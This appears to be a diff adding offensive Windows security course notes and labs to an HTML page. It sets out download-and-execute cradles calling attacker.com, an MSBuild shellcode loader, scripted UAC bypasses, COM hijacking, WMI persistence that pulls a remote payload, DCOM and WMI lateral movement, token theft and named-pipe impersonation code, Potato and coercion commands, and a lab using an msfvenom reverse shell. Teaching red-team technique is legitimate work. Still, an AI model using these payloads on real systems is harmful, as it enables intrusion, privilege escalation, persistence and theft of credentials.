+          <tr><td>certutil.exe</td><td>Decode and execute</td><td><code>certutil -decode encoded.txt payload.exe && payload.exe</code></td></tr>
+          <tr><td>msiexec.exe</td><td>Remote MSI install</td><td><code>msiexec /q /i http://attacker.com/payload.msi</code></td></tr>
+          <tr><td>wmic.exe</td><td>XSL script execution</td><td><code>wmic os get /format:"http://attacker.com/payload.xsl"</code></td></tr>
+          <tr><td>cmstp.exe</td><td>INF-based bypass</td><td><code>cmstp.exe /s /ns c:\temp\payload.inf</code></td></tr>
+          <tr><td>InstallUtil.exe</td><td>.NET assembly</td><td><code>InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe</code></td></tr>
+          <tr><td>MSBuild.exe</td><td>Inline task execution</td><td><code>MSBuild.exe payload.csproj</code></td></tr>
+          <tr><td>bitsadmin</td><td>Download + exec</td><td><code>bitsadmin /transfer job /download /priority high http://attacker.com/p.exe c:\temp\p.exe</code></td></tr>
+          <tr><td>forfiles</td><td>Proxy execution</td><td><code>forfiles /p c:\windows\system32 /m notepad.exe /c "c:\temp\payload.exe"</code></td></tr>
+          <tr><td>pcalua.exe</td><td>Program Compat Assistant</td><td><code>pcalua.exe -a c:\temp\payload.exe</code></td></tr>
+        </tbody>
+      </table>
+
+      <h3>Download Cradles</h3>
+      <pre><code class="language-powershell"># PowerShell download cradles
+# 1. WebClient (most common)
+(New-Object Net.WebClient).DownloadFile('http://attacker.com/p.exe','C:\Temp\p.exe')
+
+# 2. Invoke-WebRequest
+Invoke-WebRequest -Uri 'http://attacker.com/p.exe' -OutFile 'C:\Temp\p.exe'
+
+# 3. In-memory download + execute (fileless)
+IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
+
+# 4. Invoke-Expression with WebRequest
+IEX (Invoke-WebRequest 'http://attacker.com/script.ps1').Content
+
+# 5. System.Net.Http.HttpClient (.NET 4.5+)
+$client = New-Object System.Net.Http.HttpClient
+$result = $client.GetStringAsync('http://attacker.com/script.ps1').Result
+IEX $result</code></pre>
+
+      <pre><code class="language-bash"># certutil download
+certutil -urlcache -split -f http://attacker.com/payload.exe C:\Temp\payload.exe
+
+# bitsadmin download
+bitsadmin /transfer myDownloadJob /download /priority normal http://attacker.com/payload.exe C:\Temp\payload.exe
+
+# curl (Windows 10+)
+curl http://attacker.com/payload.exe -o C:\Temp\payload.exe</code></pre>
+
+      <h3>MSBuild Inline Task (AppLocker/WDAC Bypass)</h3>
+      <pre><code class="language-csharp">// Save as payload.csproj, execute: MSBuild.exe payload.csproj
+// MSBuild is a signed Microsoft binary, often whitelisted
+&lt;Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003"&gt;
+  &lt;Target Name="Exec"&gt;
+    &lt;ClassicTask /&gt;
+  &lt;/Target&gt;
+  &lt;UsingTask TaskName="ClassicTask" TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll"&gt;
+    &lt;Task&gt;
+      &lt;Code Type="Class" Language="cs"&gt;
+        using System;
+        using System.Runtime.InteropServices;
+        using Microsoft.Build.Framework;
+        using Microsoft.Build.Utilities;
+        public class ClassicTask : Task, ITask {
+            [DllImport("kernel32")]
+            private static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
+            [DllImport("kernel32")]
+            private static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr addr, IntPtr p, uint c, IntPtr t);
+            [DllImport("kernel32")]
+            private static extern UInt32 WaitForSingleObject(IntPtr h, UInt32 ms);
+            public override bool Execute() {
+                // msfvenom shellcode goes here
+                byte[] sc = new byte[] { 0xfc, 0x48, 0x83, /* ... */ };
+                IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
+                Marshal.Copy(sc, 0, addr, sc.Length);
+                IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+                WaitForSingleObject(hThread, 0xFFFFFFFF);
+                return true;
+            }
+        }
+      &lt;/Code&gt;
+    &lt;/Task&gt;
+  &lt;/UsingTask&gt;
+&lt;/Project&gt;</code></pre>
+
+      <!-- ─────────────────────────────────────────────────────────────── -->
+      <h2>UAC Bypass Techniques</h2>
+      <!-- ─────────────────────────────────────────────────────────────── -->
+
+      <h3>UAC Architecture</h3>
+      <p>When an admin user logs in, two tokens are created: a <strong>filtered token</strong> (standard user, used by default) and a <strong>full admin token</strong> (kept by the system). Elevation occurs via <code>consent.exe</code> displaying the UAC prompt, or silently for auto-elevating binaries. The integrity level of processes is tracked: Low → Medium → High → System.</p>
+      <p><strong>Auto-elevating conditions:</strong></p>
+      <ul>
+        <li>Executable is signed by Microsoft</li>
+        <li>Manifest contains <code>&lt;autoElevate&gt;true&lt;/autoElevate&gt;</code></li>
+        <li>Located in a secure directory (C:\Windows\System32)</li>
+      </ul>
+
+      <h3>Fodhelper Bypass</h3>
+      <p><code>fodhelper.exe</code> is an auto-elevating Microsoft binary that reads the registry key <code>HKCU\Software\Classes\ms-settings\shell\open\command</code> before executing. By setting this key to our payload, fodhelper executes it with high integrity (elevated) without a UAC prompt.</p>
+
+      <pre><code class="language-powershell"># Fodhelper UAC Bypass
+New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force
+New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" `
+    -Name "DelegateExecute" -Value "" -Force
+Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" `
+    -Name "(default)" -Value "cmd.exe /c start powershell.exe" -Force
+
+# Trigger fodhelper (auto-elevates, reads our registry key)
+Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
+
+# Cleanup
+Start-Sleep -Seconds 3
+Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force</code></pre>
+
+      <h3>Event Viewer (mmc.exe) Bypass</h3>
+      <pre><code class="language-powershell"># Event Viewer UAC Bypass (eventvwr.exe → mmc.exe)
+# eventvwr.exe auto-elevates, reads HKCU\Software\Classes\mscfile\shell\open\command
+New-Item -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
+Set-ItemProperty -Path "HKCU:\Software\Classes\mscfile\shell\open\command" `
+    -Name "(default)" -Value "cmd.exe /c powershell -ep bypass -file C:\temp\payload.ps1" -Force
+
+Start-Process "C:\Windows\System32\eventvwr.exe"
+
+Start-Sleep -Seconds 3
+Remove-Item "HKCU:\Software\Classes\mscfile" -Recurse -Force</code></pre>
+
+      <h3>CMSTPLUA COM Object Bypass</h3>
+      <pre><code class="language-powershell"># CMSTPLUA COM bypass - works on Windows 10/11
+$id = "3E5FC7F9-9A51-4367-9063-A120244FBEC7" # CMSTPLUA CLSID
+$instance = [activator]::CreateInstance(
+    [type]::GetTypeFromCLSID($id))
+$instance.ShellExec("cmd.exe", "/c powershell -ep bypass", "", "runas", 1)</code></pre>
+
+      <h3>DiskCleanup Scheduled Task (SilentCleanup)</h3>
+      <pre><code class="language-powershell"># SilentCleanup UAC bypass
+# The task runs with highest privileges and expands %windir%
+# We can hijack via environment variable
+$envPath = "HKCU:\Environment"
+Set-ItemProperty -Path $envPath -Name "windir" `
+    -Value "cmd.exe /c start powershell.exe -ep bypass &&REM " -Force
+
+# Trigger the scheduled task
+schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup" /I
+
+Start-Sleep -Seconds 3
+Remove-ItemProperty -Path $envPath -Name "windir" -Force</code></pre>
+
+      <h3>DLL Hijacking in Auto-Elevated Apps</h3>
+      <p>Some auto-elevating executables load DLLs from user-writable locations. If we can identify a missing DLL (using ProcMon) that the elevated process searches for in PATH directories, we can place a malicious DLL there. Targets: <code>computerdefaults.exe</code>, <code>fodhelper.exe</code>, <code>slui.exe</code>.</p>
+
+      <!-- ─────────────────────────────────────────────────────────────── -->
+      <h2>COM/DCOM Abuse</h2>
+      <!-- ─────────────────────────────────────────────────────────────── -->
+
+      <h3>COM Fundamentals</h3>
+      <p>COM objects are identified by <strong>CLSID</strong> (Class ID, a GUID) registered under <code>HKLM\SOFTWARE\Classes\CLSID\{...}</code> or <code>HKCU\Software\Classes\CLSID\{...}</code>. Key subkeys:</p>
+      <ul>
+        <li><code>InprocServer32</code> — DLL loaded into the calling process</li>
+        <li><code>LocalServer32</code> — standalone EXE for out-of-process COM</li>
+        <li><code>TreatAs</code> — redirects to another CLSID</li>
+      </ul>
+      <p><strong>COM Hijacking:</strong> HKCU takes precedence over HKLM. Create a CLSID entry in HKCU pointing to your malicious DLL. Any application instantiating that COM object loads your DLL instead.</p>
+
+      <pre><code class="language-powershell"># COM Hijacking for persistence
+# Find a COM object loaded by common apps (e.g., explorer.exe)
+# Using Scheduled Task COM handler CLSID as example
+$clsid = "{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}" # commonly hijackable
+
+New-Item -Path "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32" -Force
+Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32" `
+    -Name "(default)" -Value "C:\Temp\malicious.dll" -Force
+Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32" `
+    -Name "ThreadingModel" -Value "Both" -Force</code></pre>
+
+      <h3>DCOM Lateral Movement</h3>
+      <pre><code class="language-powershell"># DCOM Lateral Movement techniques
+
+# 1. MMC20.Application - ExecuteShellCommand
+$com = [activator]::CreateInstance(
+    [type]::GetTypeFromProgID("MMC20.Application", "TARGET_IP"))
+$com.Document.ActiveView.ExecuteShellCommand(
+    "cmd.exe", $null, "/c calc.exe", "7")
+
+# 2. ShellWindows (Explorer COM object)
+$com = [activator]::CreateInstance(
+    [type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39", "TARGET_IP"))
+$item = $com.Item()
+$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "C:\Windows\System32", $null, 0)
+
+# 3. ShellBrowserWindow
+$com = [activator]::CreateInstance(
+    [type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "TARGET_IP"))
+$com.Document.Application.ShellExecute("cmd.exe", "/c whoami > C:\temp\out.txt", "", $null, 0)
+
+# 4. Excel.Application (requires Office installed)
+$excel = [activator]::CreateInstance(
+    [type]::GetTypeFromProgID("Excel.Application", "TARGET_IP"))
+$excel.DisplayAlerts = $false
+$excel.DDEInitiate("cmd", "/c calc.exe")</code></pre>
+
+      <h3>COM Elevation Moniker (UAC Bypass)</h3>
+      <pre><code class="language-c">// COM Elevation Moniker - programmatic UAC bypass
+// Creates elevated COM object without user consent (for auto-elevating CLSIDs)
+#include &lt;windows.h&gt;
+#include &lt;objbase.h&gt;
+
+HRESULT CoCreateInstanceAsAdmin(HWND hwnd, REFCLSID rclsid, REFIID riid, void** ppv) {
+    WCHAR monikerName[300];
+    WCHAR clsidStr[50];
+    StringFromGUID2(rclsid, clsidStr, 50);
+    
+    wsprintfW(monikerName, L"Elevation:Administrator!new:%s", clsidStr);
+    
+    BIND_OPTS3 bo = { sizeof(bo) };
+    bo.dwClassContext = CLSCTX_LOCAL_SERVER;
+    bo.hwnd = hwnd;
+    
+    return CoGetObject(monikerName, &bo, riid, ppv);
+}</code></pre>
+
+      <!-- ─────────────────────────────────────────────────────────────── -->
+      <h2>WMI for Offense</h2>
+      <!-- ─────────────────────────────────────────────────────────────── -->
+
+      <h3>WMI Architecture</h3>
+      <p>WMI (Windows Management Instrumentation) is built on CIM (Common Information Model). Components: <strong>WMI Service</strong> (winmgmt), <strong>CIM Repository</strong> (OBJECTS.DATA at %SystemRoot%\System32\wbem\Repository), <strong>WMI Providers</strong> (DLLs that implement classes), <strong>MOF files</strong> (Managed Object Format, schema definitions).</p>
+      <p>WMI is powerful for offense because: process creation has no direct parent-child relationship (wmiprvse.exe spawns), it's built into all Windows versions, supports remote execution natively via DCOM/WinRM.</p>
+
+      <h3>Remote Execution</h3>
+      <pre><code class="language-powershell"># WMI Remote Process Creation
+# Method 1: wmic.exe
+wmic /node:"TARGET" /user:"DOMAIN\user" /password:"pass" process call create "cmd.exe /c whoami > C:\temp\out.txt"
+
+# Method 2: PowerShell Invoke-WmiMethod
+Invoke-WmiMethod -Class Win32_Process -Name Create `
+    -ArgumentList "powershell -ep bypass -c IEX(gc C:\temp\payload.ps1)" `
+    -ComputerName TARGET -Credential $cred
+
+# Method 3: CIM (newer, preferred)
+$session = New-CimSession -ComputerName TARGET -Credential $cred
+Invoke-CimMethod -ClassName Win32_Process -MethodName Create `
+    -Arguments @{CommandLine="cmd.exe /c whoami"} -CimSession $session</code></pre>
+
+      <h3>WMI Persistence (Event Subscription)</h3>
+      <p>WMI event subscriptions survive reboots. Three components are needed: an <strong>EventFilter</strong> (trigger condition), an <strong>EventConsumer</strong> (action to take), and a <strong>FilterToConsumerBinding</strong> (links them). This is extremely stealthy persistence — no files, no registry run keys, no scheduled tasks visible in Task Scheduler.</p>
+
+      <pre><code class="language-powershell"># WMI Persistence - Event Subscription
+# Trigger: every time a user logs in (Win32_LogonSession creation)
+
+# 1. Create Event Filter (trigger)
+$filterArgs = @{
+    EventNamespace = 'root\cimv2'
+    Name = 'WindowsUpdate'  # innocuous name
+    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LogonSession'"
+    QueryLanguage = 'WQL'
+}
+$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filterArgs
+
+# 2. Create Event Consumer (action - CommandLineEventConsumer)
+$consumerArgs = @{
+    Name = 'WindowsUpdate'
+    CommandLineTemplate = 'powershell.exe -ep bypass -WindowStyle hidden -c "IEX(New-Object Net.WebClient).DownloadString(''http://attacker.com/payload.ps1'')"'
+}
+$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $consumerArgs
+
+# 3. Bind filter to consumer
+$bindingArgs = @{
+    Filter = $filter
+    Consumer = $consumer
+}
+Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $bindingArgs
+
+# --- Detection/Cleanup ---
+# List all subscriptions
+Get-WmiObject -Namespace root\subscription -Class __EventFilter
+Get-WmiObject -Namespace root\subscription -Class __EventConsumer
+Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding
+
+# Remove
+Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object { $_.Name -eq 'WindowsUpdate' } | Remove-WmiObject
+Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object { $_.Name -eq 'WindowsUpdate' } | Remove-WmiObject
+Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Remove-WmiObject</code></pre>
+
+      <!-- ─────────────────────────────────────────────────────────────── -->
+      <h2>Token Manipulation</h2>
+      <!-- ─────────────────────────────────────────────────────────────── -->
+
+      <h3>Token Privileges</h3>
+      <p><strong>SeImpersonatePrivilege:</strong> Allows impersonating any token obtained via handle. Granted to: LOCAL SERVICE, NETWORK SERVICE, IIS AppPool, SQL Server service accounts. This is the prerequisite for all Potato attacks.</p>
+      <p><strong>SeAssignPrimaryTokenPrivilege:</strong> Allows assigning a primary token to a process (CreateProcessAsUser). Combined with SeImpersonate, enables full token theft.</p>
+
+      <h3>Token Theft from Elevated Process</h3>
+      <pre><code class="language-c">// Steal token from elevated process and spawn new process
+#include &lt;windows.h&gt;
+
+BOOL StealToken(DWORD targetPid) {
+    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, targetPid);
+    HANDLE hToken, hDupToken;
+    
+    // Open the target's token
+    OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken);
+    
+    // Duplicate as primary token (needed for CreateProcessWithTokenW)
+    DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL,
+        SecurityImpersonation, TokenPrimary, &hDupToken);
+    
+    // Spawn process with stolen token
+    STARTUPINFOW si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+    CreateProcessWithTokenW(hDupToken, LOGON_WITH_PROFILE,
+        L"C:\\Windows\\System32\\cmd.exe", NULL,
+        CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
+    
+    CloseHandle(hDupToken);
+    CloseHandle(hToken);
+    CloseHandle(hProcess);
+    return TRUE;
+}</code></pre>
+
+      <h3>Potato Family Attacks</h3>
+      <p>All Potato attacks exploit <strong>SeImpersonatePrivilege</strong> held by service accounts. They coerce a SYSTEM-level authentication to a controlled named pipe or COM server, then impersonate the SYSTEM token.</p>
+      
+      <table class="table table-dark table-bordered table-sm">
+        <thead><tr><th>Potato</th><th>Mechanism</th><th>Requirements</th></tr></thead>
+        <tbody>
+          <tr><td>JuicyPotato</td><td>COM/DCOM OXID resolver abuse, fake COM server</td><td>SeImpersonate, Windows &lt; Server 2019</td></tr>
+          <tr><td>RoguePotato</td><td>Redirects OXID resolution to attacker-controlled machine</td><td>SeImpersonate, remote machine for OXID redirect</td></tr>
+          <tr><td>PrintSpoofer</td><td>Exploits SpoolSS named pipe impersonation</td><td>SeImpersonate, Print Spooler running</td></tr>
+          <tr><td>GodPotato</td><td>DCOM/RPCSS abuse via IStorage trigger</td><td>SeImpersonate, .NET 4.x, Windows 2012-2022</td></tr>
+          <tr><td>SweetPotato</td><td>Combines multiple techniques (WinRM, SpoolSS, BITS)</td><td>SeImpersonate</td></tr>
+          <tr><td>CoercedPotato</td><td>Coerces SYSTEM auth via various RPC interfaces</td><td>SeImpersonate</td></tr>
+        </tbody>
+      </table>
+
+      <pre><code class="language-powershell"># PrintSpoofer exploitation (from service account context)
+# When you have SeImpersonatePrivilege
+.\PrintSpoofer64.exe -i -c "cmd /c whoami"
+# Expected output: nt authority\system
+
+# JuicyPotato (older systems)
+.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t *
+
+# GodPotato (.NET required)
+.\GodPotato.exe -cmd "cmd /c whoami"
+
+# SweetPotato
+.\SweetPotato.exe -p C:\Windows\System32\cmd.exe -a "/c whoami"</code></pre>
+
+      <h3>Named Pipe Impersonation</h3>
+      <pre><code class="language-c">// Named Pipe Server - Impersonate connecting client
+#include &lt;windows.h&gt;
+
+DWORD WINAPI PipeServer(LPVOID lpParam) {
+    HANDLE hPipe = CreateNamedPipeA(
+        "\\\\.\\pipe\\evil_pipe",
+        PIPE_ACCESS_DUPLEX,
+        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
+        1, 1024, 1024, 0, NULL);
+    
+    // Wait for client connection (e.g., coerced SYSTEM service)
+    ConnectNamedPipe(hPipe, NULL);
+    
+    // Read something to complete the auth handshake
+    char buf[256];
+    DWORD bytesRead;
+    ReadFile(hPipe, buf, sizeof(buf), &bytesRead, NULL);
+    
+    // Impersonate the connected client (SYSTEM if coerced)
+    ImpersonateNamedPipeClient(hPipe);
+    
+    // Now running as the impersonated identity
+    HANDLE hToken;
+    OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken);
+    
+    // Spawn process as impersonated user
+    HANDLE hDupToken;
+    DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL,
+        SecurityImpersonation, TokenPrimary, &hDupToken);
+    
+    STARTUPINFOW si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+    CreateProcessWithTokenW(hDupToken, 0,
+        L"C:\\Windows\\System32\\cmd.exe", NULL,
+        CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
+    
+    RevertToSelf();
+    CloseHandle(hPipe);
+    return 0;
+}</code></pre>
+
+      <!-- ─────────────────────────────────────────────────────────────── -->
+      <h2>Named Pipe Exploitation</h2>
+      <!-- ─────────────────────────────────────────────────────────────── -->
+
+      <h3>Coercing Authentication to Named Pipes</h3>
+      <p>Several Windows services can be tricked into authenticating to an attacker-controlled named pipe. When a SYSTEM service connects, the attacker impersonates the SYSTEM token.</p>
+
+      <table class="table table-dark table-bordered table-sm">
+        <thead><tr><th>Technique</th><th>Service</th><th>Trigger Method</th></tr></thead>
+        <tbody>
+          <tr><td>SpoolSample / PrinterBug</td><td>Print Spooler (Spoolsv)</td><td>RpcRemoteFindFirstPrinterChangeNotification → connects back to \\attacker\pipe</td></tr>
+          <tr><td>PetitPotam</td><td>LSARPC (EfsRpcOpenFileRaw)</td><td>EFS RPC call with UNC path → SYSTEM auth to attacker</td></tr>
+          <tr><td>DFSCoerce</td><td>DFS (Netlogon)</td><td>NetrDfsRemoveStdRoot / NetrDfsAddStdRoot with UNC path</td></tr>
+          <tr><td>ShadowCoerce</td><td>File Server VSS Agent</td><td>IsPathShadowCopied / IsPathSupported</td></tr>
+          <tr><td>MS-EFSR abuse</td><td>EFS</td><td>Multiple EFS RPC methods accept UNC paths</td></tr>
+        </tbody>
+      </table>
+
+      <pre><code class="language-powershell"># Coercing SYSTEM authentication examples
+
+# SpoolSample (Print Spooler RPC)
+# From attacker machine, coerce DC to authenticate to our listener
+.\SpoolSample.exe DC01 ATTACKER_IP
+
+# PetitPotam (no auth required on unpatched systems!)
+python3 PetitPotam.py ATTACKER_IP DC01
+
+# DFSCoerce
+python3 dfscoerce.py -u user -p pass -d domain.local ATTACKER_IP DC01
+
+# On the attacker side, catch with:
+# - Responder (NTLMv2 hash capture)
+# - ntlmrelayx (relay to another service)
+# - Custom named pipe server (local priv esc)</code></pre>
+
+      <!-- ─────────────────────────────────────────────────────────────── -->
+      <h2>MITRE ATT&CK Windows Techniques Reference</h2>
+      <!-- ─────────────────────────────────────────────────────────────── -->
+
+      <h3>Initial Access</h3>
+      <table class="table table-dark table-bordered table-sm">
+        <thead><tr><th>ID</th><th>Technique</th><th>Example</th></tr></thead>
+        <tbody>
+          <tr><td>T1566.001</td><td>Spearphishing Attachment</td><td>Macro-enabled Office doc, ISO/IMG with LNK</td></tr>
+          <tr><td>T1566.002</td><td>Spearphishing Link</td><td>HTML smuggling, drive-by download</td></tr>
+          <tr><td>T1190</td><td>Exploit Public-Facing Application</td><td>Exchange ProxyLogon/ProxyShell, Log4Shell</td></tr>
+          <tr><td>T1078</td><td>Valid Accounts</td><td>Credential stuffing, purchased creds</td></tr>
+        </tbody>
+      </table>
+
+      <h3>Execution</h3>
+      <table class="table table-dark table-bordered table-sm">
+        <thead><tr><th>ID</th><th>Technique</th><th>Example</th></tr></thead>
+        <tbody>
+          <tr><td>T1059.001</td><td>PowerShell</td><td>Fileless execution, download cradle</td></tr>
+          <tr><td>T1059.003</td><td>Windows Command Shell</td><td>cmd.exe /c, batch scripts</td></tr>
+          <tr><td>T1059.005</td><td>Visual Basic</td><td>VBA macros, VBScript via wscript/cscript</td></tr>
+          <tr><td>T1053.005</td><td>Scheduled Task</td><td>schtasks /create for persistence/lateral</td></tr>
+          <tr><td>T1047</td><td>WMI</td><td>wmic process call create, WMI subscriptions</td></tr>
+        </tbody>
+      </table>
+
+      <h3>Persistence</h3>
+      <table class="table table-dark table-bordered table-sm">
+        <thead><tr><th>ID</th><th>Technique</th><th>Example</th></tr></thead>
+        <tbody>
+          <tr><td>T1547.001</td><td>Registry Run Keys</td><td>HKCU\...\Run, HKLM\...\Run</td></tr>
+          <tr><td>T1543.003</td><td>Windows Service</td><td>sc create, New-Service</td></tr>
+          <tr><td>T1546.003</td><td>WMI Event Subscription</td><td>__EventFilter + Consumer</td></tr>
+          <tr><td>T1546.015</td><td>COM Hijacking</td><td>HKCU CLSID InprocServer32 override</td></tr>
+          <tr><td>T1053.005</td><td>Scheduled Task</td><td>schtasks with SYSTEM privileges</td></tr>
+          <tr><td>T1547.004</td><td>Winlogon Helper DLL</td><td>Winlogon\Shell, Userinit registry</td></tr>
+        </tbody>
+      </table>
+
+      <h3>Privilege Escalation</h3>
+      <table class="table table-dark table-bordered table-sm">
+        <thead><tr><th>ID</th><th>Technique</th><th>Example</th></tr></thead>
+        <tbody>
+          <tr><td>T1134.001</td><td>Token Impersonation/Theft</td><td>Potato attacks, token duplication</td></tr>
+          <tr><td>T1068</td><td>Exploitation for Privilege Escalation</td><td>Kernel exploits, driver vulnerabilities</td></tr>
+          <tr><td>T1548.002</td><td>UAC Bypass</td><td>Fodhelper, CMSTPLUA, DiskCleanup</td></tr>
+          <tr><td>T1574.001</td><td>DLL Search Order Hijacking</td><td>Phantom DLL, missing DLL in PATH</td></tr>
+          <tr><td>T1574.002</td><td>DLL Side-Loading</td><td>Signed app loads malicious DLL</td></tr>
+        </tbody>
+      </table>
+
+      <h3>Defense Evasion</h3>
+      <table class="table table-dark table-bordered table-sm">
+        <thead><tr><th>ID</th><th>Technique</th><th>Example</th></tr></thead>
+        <tbody>
+          <tr><td>T1055</td><td>Process Injection</td><td>All injection variants discussed above</td></tr>
+          <tr><td>T1027</td><td>Obfuscated Files/Information</td><td>Packed binaries, encrypted payloads</td></tr>
+          <tr><td>T1562.001</td><td>Disable/Modify Tools</td><td>AMSI/ETW patching, Defender exclusions</td></tr>
+          <tr><td>T1218</td><td>System Binary Proxy Execution</td><td>LOLBAS: mshta, rundll32, regsvr32</td></tr>
+          <tr><td>T1036</td><td>Masquerading</td><td>Rename binary, timestamp stomping</td></tr>
+          <tr><td>T1070.004</td><td>File Deletion</td><td>Delete artifacts after execution</td></tr>
+        </tbody>
+      </table>
+
+      <h3>Credential Access</h3>
+      <table class="table table-dark table-bordered table-sm">
+        <thead><tr><th>ID</th><th>Technique</th><th>Example</th></tr></thead>
+        <tbody>
+          <tr><td>T1003.001</td><td>LSASS Memory</td><td>Mimikatz sekurlsa::logonpasswords, comsvcs.dll MiniDump</td></tr>
+          <tr><td>T1003.002</td><td>Security Account Manager</td><td>reg save HKLM\SAM, secretsdump</td></tr>
+          <tr><td>T1003.003</td><td>NTDS</td><td>ntdsutil, DCSync (DRS replication)</td></tr>
+          <tr><td>T1558.003</td><td>Kerberoasting</td><td>Request TGS for SPN, crack offline</td></tr>
+          <tr><td>T1558.004</td><td>AS-REP Roasting</td><td>No preauth → offline crack</td></tr>
+          <tr><td>T1557.001</td><td>LLMNR/NBT-NS Poisoning</td><td>Responder, Inveigh</td></tr>
+        </tbody>
+      </table>
+
+      <h3>Lateral Movement</h3>
+      <table class="table table-dark table-bordered table-sm">
+        <thead><tr><th>ID</th><th>Technique</th><th>Example</th></tr></thead>
+        <tbody>
+          <tr><td>T1021.002</td><td>SMB/Windows Admin Shares</td><td>psexec, smbexec, C$/ADMIN$</td></tr>
+          <tr><td>T1021.003</td><td>DCOM</td><td>MMC20, ShellWindows objects</td></tr>
+          <tr><td>T1021.006</td><td>Windows Remote Management</td><td>WinRM, Evil-WinRM, Enter-PSSession</td></tr>
+          <tr><td>T1021.001</td><td>Remote Desktop Protocol</td><td>xfreerdp, mstsc with stolen creds</td></tr>
+          <tr><td>T1047</td><td>WMI</td><td>wmic /node, Invoke-WmiMethod</td></tr>
+        </tbody>
+      </table>
+
+    </div><!-- end notes tab -->
+
+    <!-- ═══════════════════════════════════════════════════════════════════════ -->
+    <!-- LABS TAB -->
+    <!-- ═══════════════════════════════════════════════════════════════════════ -->
+    <div class="tab-pane fade" id="lab" role="tabpanel" aria-labelledby="lab-tab">
+
+      <h2>Hands-On Labs</h2>
+
+      <!-- Lab 1 -->
+      <div class="card bg-dark mb-3">
+        <div class="card-header"><h4>Lab 1: Classic DLL Injection</h4></div>
+        <div class="card-body">
+          <p><strong>Objective:</strong> Inject a custom DLL into a running notepad.exe process using CreateRemoteThread + LoadLibrary.</p>
+          <p><strong>Setup:</strong> Windows 10/11 VM, Visual Studio, disable Defender real-time protection.</p>
+          <h5>Steps:</h5>
+          <ol>
+            <li>Create a DLL project that pops a MessageBox on DLL_PROCESS_ATTACH</li>
+            <li>Create the injector program using the code from the notes section</li>
+            <li>Launch notepad.exe, note its PID (Task Manager or <code>tasklist</code>)</li>
+            <li>Run injector with the PID and DLL path as arguments</li>
+            <li>Observe MessageBox appearing in notepad's context</li>
+          </ol>
+          <h5>DLL Payload:</h5>
+          <pre><code class="language-c">// payload.dll
+#include &lt;windows.h&gt;
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
+    if (reason == DLL_PROCESS_ATTACH) {
+        MessageBoxA(NULL, "Injected!", "DLL Injection Lab", MB_OK);
+    }
+    return TRUE;
+}</code></pre>
+          <h5>Verification:</h5>
+          <ul>
+            <li>Use Process Hacker/Process Explorer to confirm your DLL is loaded in notepad's module list</li>
+            <li>Check the loaded modules tab for your DLL path</li>
+            <li>Monitor with API Monitor to see the LoadLibrary call</li>
+          </ul>
+          <p><strong>Extension:</strong> Try injecting into a process running as a different user (requires SeDebugPrivilege). Monitor with Sysmon Event ID 8 (CreateRemoteThread).</p>
+        </div>
+      </div>
+
+      <!-- Lab 2 -->
+      <div class="card bg-dark mb-3">
+        <div class="card-header"><h4>Lab 2: Process Hollowing</h4></div>
+        <div class="card-body">
+          <p><strong>Objective:</strong> Hollow out svchost.exe and replace its image with a reverse shell payload.</p>
+          <h5>Steps:</h5>
+          <ol>
+            <li>Generate shellcode: <code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -f raw -o sc.bin</code></li>
+            <li>Create the hollowing tool (compile as x64, use the code from notes)</li>
+            <li>Modify to read a PE file (your payload) and inject into a suspended svchost.exe</li>
+            <li>Start a listener: <code>nc -lvnp 4444</code></li>
+            <li>Run the hollower targeting svchost.exe</li>
+            <li>Verify the connection comes from svchost.exe (check PID on netstat)</li>
+          </ol>
+          <h5>Detection Analysis:</h5>
+          <ul>
+            <li>Use Process Hacker: compare image path in process properties vs actual memory content</li>
+            <li>Sysmon Event ID 25 (Process Tampering) on newer Windows</li>
